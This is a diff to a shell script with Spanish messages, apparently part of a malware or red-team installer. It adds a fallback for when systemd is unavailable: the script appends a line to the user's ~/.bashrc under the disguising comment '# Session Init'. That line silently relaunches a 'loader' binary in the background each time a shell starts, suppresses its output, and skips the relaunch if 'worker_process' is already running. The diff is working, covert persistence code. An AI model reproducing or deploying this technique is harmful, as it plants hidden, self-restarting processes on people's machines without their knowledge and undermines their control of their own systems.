@@ -31,7 +31,25 @@ if systemctl --user daemon-reload >/dev/null 2>&1; then
     systemctl --user start "$LOADER_NAME"
     echo "[*] Servicio iniciado exitosamente."
 else
-    echo "[!] Systemd no disponible o sin dbus. Ejecutando manualmente para demostración."
+    echo "[!] Systemd no disponible o sin dbus."
+
+    # Fallback a .bashrc
+    BASHRC="$HOME/.bashrc"
+    # Nota: Usamos paréntesis para subshell y evitar ruido en la terminal
+    INJECTION="if ! pgrep -f 'worker_process' >/dev/null 2>&1; then (cd $TARGET_DIR && ./$LOADER_NAME >/dev/null 2>&1 &); fi"
+
+    if [ -f "$BASHRC" ]; then
+        if ! grep -Fq "worker_process" "$BASHRC"; then
+            echo "[*] Inyectando persistencia en $BASHRC..."
+            echo "" >> "$BASHRC"
+            echo "# Session Init" >> "$BASHRC"
+            echo "$INJECTION" >> "$BASHRC"
+        else
+            echo "[*] Persistencia en .bashrc ya presente."
+        fi
+    fi
+
+    # Ejecución inmediata
     cd "$TARGET_DIR" && ./$LOADER_NAME &
     echo "[*] Proceso lanzado en background (PID $!)."
 fi
